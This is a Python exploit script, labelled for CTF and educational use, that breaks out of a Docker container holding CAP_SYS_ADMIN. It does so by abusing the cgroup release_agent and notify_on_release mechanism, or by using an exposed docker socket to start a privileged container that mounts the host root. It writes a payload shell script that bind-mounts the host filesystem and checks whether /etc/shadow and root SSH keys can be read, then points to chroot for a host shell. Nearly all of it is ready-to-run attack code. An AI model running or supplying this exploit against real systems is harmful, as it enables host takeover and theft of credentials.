#!/usr/bin/env python3
"""
Docker Container Breakout Exploit using CAP_SYS_ADMIN capability
For CTF challenges - Educational purposes only
"""

import os
import subprocess
import time
import argparse
import shutil
import stat
import tempfile
import sys

def run_command(command, shell=False, timeout=30):
    """Run a system command and return the output"""
    try:
        if shell:
            process = subprocess.run(
                command, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                text=True, 
                timeout=timeout
            )
        else:
            process = subprocess.run(
                command.split(), 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                text=True, 
                timeout=timeout
            )
        return process.stdout.strip(), process.stderr.strip(), process.returncode
    except subprocess.TimeoutExpired:
        return "", f"Command timed out after {timeout} seconds", 1
    except Exception as e:
        return "", str(e), 1

def check_requirements():
    """Check if we have the necessary capabilities to perform the breakout"""
    print("[*] Checking requirements...")

    # Check if CAP_SYS_ADMIN capability is available
    stdout, stderr, ret = run_command("capsh --print")
    if "cap_sys_admin" not in stdout.lower():
        print("[-] Error: CAP_SYS_ADMIN capability not available")
        print("    This exploit requires CAP_SYS_ADMIN capability")
        return False

    # Check for the presence of mount command
    if not shutil.which("mount"):
        print("[-] Error: 'mount' command not found")
        return False

    # Check for the presence of cgroupfs in the container
    if not os.path.exists("/sys/fs/cgroup"):
        print("[-] Error: cgroup filesystem not found at /sys/fs/cgroup")
        return False

    return True

def prepare_exploit_device():
    """Prepare the exploit by creating a temporary directory for the mountpoint"""
    print("[*] Preparing exploit environment...")
    
    # Create a temporary directory for our mount
    temp_dir = tempfile.mkdtemp()
    print(f"[+] Created temporary directory: {temp_dir}")

    # Find a cgroup directory we can mount
    cgroup_targets = [
        "/sys/fs/cgroup/memory",
        "/sys/fs/cgroup/memory/container",
        "/sys/fs/cgroup",
        "/sys/fs/cgroup/docker"
    ]
    
    cgroup_target = None
    for target in cgroup_targets:
        if os.path.exists(target) and os.access(target, os.W_OK):
            cgroup_target = target
            break

    if not cgroup_target:
        # Try to create our own cgroup
        os.makedirs("/tmp/cgroup/exploit", exist_ok=True)
        cgroup_target = "/tmp/cgroup/exploit"
        stdout, stderr, ret = run_command(f"mount -t cgroup -o memory cgroup {cgroup_target}", shell=True)
        if ret != 0:
            print(f"[-] Failed to create and mount cgroup: {stderr}")
            return None, None
    
    print(f"[+] Found usable cgroup at: {cgroup_target}")
    return temp_dir, cgroup_target

def create_payload_script(cgroup_path):
    """Create the payload script that will be executed with elevated privileges"""
    script_path = "/tmp/escape.sh"
    with open(script_path, "w") as f:
        f.write("""#!/bin/sh
# Break out from the container by accessing host filesystem
mkdir -p /tmp/hostfs
mount -t proc none /proc || echo "Failed to remount proc"
cd /proc/1/root || { echo "Failed to access /proc/1/root"; exit 1; }

# Mount the host root filesystem to our temporary directory
mount -o bind . /tmp/hostfs

# Check if we have access to the host filesystem
if [ -d /tmp/hostfs/etc ]; then
    echo "[+] SUCCESS: Container breakout achieved!"
    echo "[+] Host filesystem mounted at /tmp/hostfs"
    echo "[+] You can now access the host filesystem"
    
    # Prove we have access to the host by displaying hostname and IP
    echo "[+] Host Information:"
    echo "    - Hostname: $(cat /tmp/hostfs/etc/hostname 2>/dev/null || echo "Unknown")"
    echo "    - Host /etc/shadow access: $(test -r /tmp/hostfs/etc/shadow && echo "Yes" || echo "No")"
    echo "    - Host /etc/passwd: $(head -n1 /tmp/hostfs/etc/passwd 2>/dev/null || echo "Access denied")"
    
    # Check for common sensitive files on the host
    echo "[+] Sensitive files on host:"
    test -f /tmp/hostfs/etc/shadow && echo "    - /etc/shadow exists"
    test -f /tmp/hostfs/root/.ssh/id_rsa && echo "    - /root/.ssh/id_rsa exists"
    test -d /tmp/hostfs/root && echo "    - /root directory accessible"
    
    # Create a proof file on the host if possible
    if touch /tmp/hostfs/tmp/container_escape_proof 2>/dev/null; then
        echo "[+] Created proof file on host at /tmp/container_escape_proof"
    fi
    
    # Provide instructions for further exploitation
    echo "[!] To get a shell with host access: chroot /tmp/hostfs /bin/bash"
else
    echo "[-] Failed to access host filesystem"
    exit 1
fi
""")
    os.chmod(script_path, 0o755)
    print(f"[+] Created payload script at: {script_path}")
    return script_path

def exploit_cgroup_release_agent(temp_dir, cgroup_path, payload_script):
    """Exploit using the cgroup release_agent technique"""
    print("[*] Attempting breakout using cgroup release_agent technique...")
    
    # Create a new cgroup
    exploit_dir = os.path.join(cgroup_path, "exploit_" + str(os.getpid()))
    os.makedirs(exploit_dir, exist_ok=True)
    print(f"[+] Created cgroup directory: {exploit_dir}")

    # Configure release_agent to point to our payload script
    release_agent_path = os.path.join(os.path.dirname(exploit_dir), "release_agent")
    
    # Check if release_agent is writable
    try:
        with open(release_agent_path, "w") as f:
            f.write(payload_script)
        print(f"[+] Set release_agent to: {payload_script}")
    except Exception as e:
        print(f"[-] Failed to write to release_agent: {e}")
        
        # Try the notify_on_release method instead
        print("[*] Trying alternative method with notify_on_release...")
        try:
            # Enable notify_on_release
            with open(os.path.join(exploit_dir, "notify_on_release"), "w") as f:
                f.write("1")
            
            # Set the release_agent
            with open(os.path.join(os.path.dirname(exploit_dir), "release_agent"), "w") as f:
                f.write(payload_script)
                
            # Write to the cgroup.procs file to trigger the release_agent
            with open(os.path.join(exploit_dir, "cgroup.procs"), "w") as f:
                f.write("1")
                
            print("[+] Triggered notify_on_release mechanism")
        except Exception as e:
            print(f"[-] Failed to use notify_on_release method: {e}")
            return False
    
    # Trigger the release_agent by removing the cgroup
    try:
        time.sleep(1)  # Give it a moment to ensure everything is set up
        print("[*] Triggering release_agent by removing cgroup...")
        os.rmdir(exploit_dir)
        
        # Wait for the exploit to complete
        time.sleep(2)
        
        # Check if the exploit was successful
        if os.path.exists("/tmp/hostfs/etc"):
            print("[+] Exploit successful! Host filesystem mounted at /tmp/hostfs")
            print("[+] You can now access the host filesystem")
            print("[+] For an interactive shell with host filesystem access, run:")
            print("    chroot /tmp/hostfs /bin/bash")
            return True
        else:
            print("[-] Exploit seems to have failed - host filesystem not accessible at /tmp/hostfs")
            return False
            
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")
        return False

def exploit_docker_binary(binary_path):
    """Exploit using docker binary if available"""
    print("[*] Attempting breakout using docker binary...")
    
    if not os.path.isfile(binary_path) or not os.access(binary_path, os.X_OK):
        print(f"[-] Docker binary not found or not executable at {binary_path}")
        return False
        
    # Check if docker socket is accessible
    if not os.path.exists("/var/run/docker.sock"):
        print("[-] Docker socket not found at /var/run/docker.sock")
        return False
        
    # Attempt to exploit by creating a privileged container that mounts host filesystem
    cmd = f"{binary_path} run --rm -it --privileged -v /:/hostfs alpine:latest chroot /hostfs /bin/sh"
    print(f"[*] Executing: {cmd}")
    
    try:
        os.execl("/bin/sh", "sh", "-c", cmd)
        # We should never reach here if execl succeeds
        return False
    except Exception as e:
        print(f"[-] Docker exploitation failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Docker Container Breakout Exploit for CTFs")
    parser.add_argument("--method", choices=["cgroup", "docker", "auto"], default="auto",
                       help="Exploitation method to use (default: auto)")
    parser.add_argument("--docker-path", default="/usr/bin/docker",
                       help="Path to docker binary (default: /usr/bin/docker)")
    args = parser.parse_args()
    
    print("╔═══════════════════════════════════════════════╗")
    print("║ Container Breakout Exploit                    ║")
    print("║ For CTF challenges - Educational use only     ║")
    print("╚═══════════════════════════════════════════════╝")
    
    # Check if we have the necessary privileges
    if not check_requirements():
        print("[-] Exploit prerequisites not met.")
        sys.exit(1)
    
    # Select exploitation method
    if args.method == "docker" or (args.method == "auto" and os.path.exists(args.docker_path)):
        if exploit_docker_binary(args.docker_path):
            sys.exit(0)
        elif args.method == "docker":
            print("[-] Docker method failed, exiting")
            sys.exit(1)
        print("[*] Docker method failed, falling back to cgroup method")
        
    # Try cgroup method
    temp_dir, cgroup_path = prepare_exploit_device()
    if not temp_dir or not cgroup_path:
        print("[-] Failed to prepare exploit environment")
        sys.exit(1)
        
    payload_script = create_payload_script(cgroup_path)
    if not payload_script:
        print("[-] Failed to create payload script")
        sys.exit(1)
        
    if exploit_cgroup_release_agent(temp_dir, cgroup_path, payload_script):
        print("[+] Exploit complete! Access host filesystem at /tmp/hostfs")
        sys.exit(0)
    else:
        print("[-] Exploit failed. Try modifying the script or try a different approach.")
        sys.exit(1)

if __name__ == "__main__":
    main()